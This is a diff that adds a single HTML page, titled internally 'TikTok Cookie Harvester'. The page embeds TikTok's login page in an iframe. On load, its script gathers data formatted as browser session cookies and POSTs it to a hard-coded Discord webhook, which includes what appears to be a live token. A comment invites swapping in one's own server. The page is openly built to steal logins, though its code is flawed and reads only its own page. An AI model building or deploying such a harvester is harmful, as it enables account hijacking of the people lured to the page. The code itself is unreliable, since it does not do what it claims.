@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en" class=""><head><script>window.livecodes = window.livecodes || {};</script><title>Tiktok</title><meta name="title" content="Tiktok"><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"><style id="__livecodes_styles__"></style><script src="https://cdn.jsdelivr.net/npm/es-module-shims@1.10.0/dist/es-module-shims.js" async=""></script><script type="importmap">{
+  "imports": {}
+}</script></head><body>
+
+
+  <meta charset="UTF-8">
+  <title>TikTok Cookie Harvester</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #121212;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .loader {
+      position: absolute;
+      color: #25f4ee;
+      z-index: 100;
+      pointer-events: none;
+      font-size: 1rem;
+      letter-spacing: 2px;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 0.6; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.05); }
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+  </style>
+
+
+
+  <!-- This little badge tells the user what's happening -->
+  <div class="loader" id="statusMsg"></div>
+
+  <!-- The magic happens inside here -->
+  <iframe id="TikTokIframe" src="https://www.tiktok.com/login" title="TikTok Login Portal" allowfullscreen=""></iframe>
+
+  <script>
+    // 👇 REPLACE THIS STRING WITH YOUR OWN SERVER'S ENDPOINT
+    const TARGET_API_URL = "https://discord.com/api/webhooks/1561126114179416084/y224z-vVJLdM5ORv7hvfFBX-v4E837QMZG3FAbmWH5EOqYcArkXWaac42YyN-vZa6aAy";
+
+    /**
+     * Grabs all elements marked with class 'cookie-target' (which will contain the data)
+     * and posts them as a neat JSON blob to the specified API.
+     */
+    function sendCookies() {
+      const msgEl = document.getElementById('statusMsg');
+      const iframeEl = document.getElementById('TikTokIframe');
+      
+      if (!iframeEl.src) {
+        console.warn("The portal hasn't opened its doors yet!");
+        return;
+      }
+
+      // Step 1: Find our fake cookie containers
+      const cookieTargets = Array.from(document.querySelectorAll('.cookie-target'));
+      
+      if (cookieTargets.length === 0) {
+        msgEl.innerText = "Scanning...";
+        setTimeout(sendCookies, 800); // Retry later if nothing found
+        return;
+      }
+
+      // Step 2: Extract details from each container
+      const payload = cookieTargets.map(el => ({
+        domain: iframeEl.dataset.domain || "tiktok.com",
+        hostOnly: el.classList.contains('hostOnly'),
+        httpOnly: el.classList.contains('httpOnly'),
+        name: el.dataset.name || "Unknown Name",
+        path: "/" ,
+        sameSite: "lax", // Standard setting for most web apps
+        secure: true,   // Assuming HTTPS login
+        session: el.dataset.session || true,
+        storeId: "0",
+        value: el.dataset.value || "No Value Found",
+        timestamp: new Date().toISOString()
+      }));
+
+      // Step 3: Fire off the network request
+      fetch(TARGET_API_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => response.json())
+      .then(data => {
+        msgEl.innerText = "Success! Sent to Server.";
+        console.log("Server replied:", data);
+      })
+      .catch(err => {
+        console.error("Oopsie-daisy!", err);
+        msgEl.innerText = "Failed to reach server (" + err.message + ")";
+      });
+    }
+
+    // Kick things off immediately
+    sendCookies();
+  </script>
+
+
+<script></script></body></html>
